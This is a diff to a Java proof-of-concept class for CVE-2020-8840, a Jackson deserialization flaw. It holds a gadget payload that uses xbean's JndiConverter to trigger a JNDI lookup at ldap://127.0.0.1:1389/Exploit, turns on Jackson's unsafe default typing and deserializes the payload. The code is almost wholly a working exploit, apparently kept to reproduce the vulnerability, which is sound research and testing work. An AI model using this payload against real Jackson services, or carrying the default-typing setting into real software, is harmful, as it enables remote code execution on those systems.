@@ -3,6 +3,7 @@ package com.test.jackson;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
 import java.io.IOException;
+import java.lang.reflect.Array;
 
 /**
  * CVE-2020-8840
@@ -17,7 +18,7 @@ public class CVE_2020_8840 {
         //CVE-2020-8840
         String payload = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://127.0.0.1:1389/Exploit\"}]";
         ObjectMapper mapper = new ObjectMapper();
-        mapper.enableDefaultTyping();
+        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
         try {
             mapper.readValue(payload, Object.class);
         } catch (IOException e) {
